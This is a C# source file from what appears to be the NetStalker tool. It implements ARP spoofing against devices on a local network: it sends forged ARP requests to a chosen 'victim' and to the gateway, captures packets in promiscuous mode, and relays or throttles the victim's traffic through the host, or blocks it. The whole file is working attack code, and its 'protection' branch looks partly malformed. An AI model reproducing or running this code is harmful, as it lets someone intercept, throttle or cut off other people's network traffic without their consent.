using PacketDotNet;
using SharpPcap;
using SharpPcap.Npcap;
using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading.Tasks;

namespace NetStalker.MainLogic
{
    public class Blocker_Redirector
    {
        //Main capture device
        public static ICaptureDevice MainDevice;
        //BR Task
        public static Task BRTask;
        //Main activation switch
        public static bool BRMainSwitch = false;

        /// <summary>
        /// This is the main method for blocking and redirection of targeted devices
        /// </summary>
        public static void BlockAndRedirect()
        {
            if (!BRMainSwitch)
                throw new InvalidOperationException("\"BRMainSwitch\" must be set to \"True\" in order to activate the BR");

            if (string.IsNullOrEmpty(Properties.Settings.Default.gatewaymac))
            {
                Properties.Settings.Default.gatewaymac = Main.Devices.Where(d => d.IP.Equals(AppConfiguration.GatewayIp)).Select(d => d.MAC).FirstOrDefault().ToString();
                Properties.Settings.Default.Save();
            }

            if (MainDevice == null)
                MainDevice = CaptureDeviceList.New()[(from devicex in CaptureDeviceList.Instance where ((NpcapDevice)devicex).Interface.FriendlyName == NetStalker.Properties.Settings.Default.friendlyname select devicex).ToList()[0].Name];

            MainDevice.Open(DeviceMode.Promiscuous, 1000);
            MainDevice.Filter = "ip";

            BRTask = Task.Run(() =>
             {
                 RawCapture rawCapture;
                 EthernetPacket packet;

                 while (BRMainSwitch)
                 {
                     if ((rawCapture = MainDevice.GetNextPacket()) != null)
                     {
                         packet = Packet.ParsePacket(rawCapture.LinkLayerType, rawCapture.Data) as EthernetPacket;
                         if (packet == null)
                             continue;

                         Device device;

                         if ((device = Main.Devices.FirstOrDefault(D => D.MAC.Equals(packet.SourceHardwareAddress))) != null && device.Redirected)
                         {
                             if (device.UploadCap == 0 || device.UploadCap > device.PacketsSentSinceLastReset)
                             {
                                 packet.SourceHardwareAddress = MainDevice.MacAddress;
                                 packet.DestinationHardwareAddress = AppConfiguration.GatewayMac;
                                 MainDevice.SendPacket(packet);
                                 device.PacketsSentSinceLastReset += packet.Bytes.Length;
                             }
                         }
                         else if (packet.SourceHardwareAddress.Equals(AppConfiguration.GatewayMac))
                         {
                             IPv4Packet IPV4 = packet.Extract<IPv4Packet>();

                             if ((device = Main.Devices.FirstOrDefault(D => D.IP.Equals(IPV4.DestinationAddress))) != null && device.Redirected)
                             {
                                 if (device.DownloadCap == 0 || device.DownloadCap > device.PacketsReceivedSinceLastReset)
                                 {
                                     packet.SourceHardwareAddress = MainDevice.MacAddress;
                                     packet.DestinationHardwareAddress = device.MAC;
                                     MainDevice.SendPacket(packet);
                                     device.PacketsReceivedSinceLastReset += packet.Bytes.Length;
                                 }
                             }
                         }
                     }

                     SpoofClients();
                 }
             });
        }

        /// <summary>
        /// Loop around the list of targeted devices and spoof them.
        /// </summary>
        public static void SpoofClients()
        {
            foreach (Device item in Main.Devices)
            {
                if (item.Blocked)
                {
                    ConstructAndSendArp(item, BROperation.Spoof);
                    if (AppConfiguration.SpoofProtection)
                        ConstructAndSendArp(item, BROperation.Protection);
                }
            }
        }

        /// <summary>
        /// Build an Arp packet for the selected device based on the operation type and send it.
        /// </summary>
        /// <param name="device">The targeted device</param>
        /// <param name="Operation">Operation type</param>
        public static void ConstructAndSendArp(Device device, BROperation Operation)
        {
            if (Operation == BROperation.Spoof)
            {
                ArpPacket ArpPacketForVicSpoof = new ArpPacket(ArpOperation.Request, device.MAC, device.IP, MainDevice.MacAddress, AppConfiguration.GatewayIp);
                ArpPacket ArpPacketForGatewaySpoof = new ArpPacket(ArpOperation.Request, AppConfiguration.GatewayMac, AppConfiguration.GatewayIp, MainDevice.MacAddress, device.IP);
                EthernetPacket EtherPacketForVicSpoof = new EthernetPacket(MainDevice.MacAddress, device.MAC, EthernetType.Arp)
                {
                    PayloadPacket = ArpPacketForVicSpoof
                };
                EthernetPacket EtherPacketForGatewaySpoof = new EthernetPacket(MainDevice.MacAddress, AppConfiguration.GatewayMac, EthernetType.Arp)
                {
                    PayloadPacket = ArpPacketForGatewaySpoof
                };

                MainDevice.SendPacket(EtherPacketForVicSpoof);
                if (device.Redirected)
                    MainDevice.SendPacket(EtherPacketForGatewaySpoof);

            }
            else
            {
                ArpPacket ArpPacketForVicProtection = new ArpPacket(ArpOperation.Request, MainDevice.MacAddress, AppConfiguration.LocalIp, device.MAC, device.IP);
                ArpPacket ArpPacketForGatewayProtection = new ArpPacket(ArpOperation.Request, MainDevice.MacAddress, AppConfiguration.LocalIp, AppConfiguration.GatewayMac, AppConfiguration.GatewayIp)
                {
                    PayloadPacket = ArpPacketForVicProtection
                };
                EthernetPacket EtherPacketForVicProtection = new EthernetPacket(device.MAC, MainDevice.MacAddress, EthernetType.Arp);
                EthernetPacket EtherPacketForGatewayProtection = new EthernetPacket(AppConfiguration.GatewayMac, MainDevice.MacAddress, EthernetType.Arp)
                {
                    PayloadPacket = ArpPacketForGatewayProtection
                };

                MainDevice.SendPacket(EtherPacketForGatewayProtection);
                MainDevice.SendPacket(EtherPacketForVicProtection);
            }
        }
    }
}
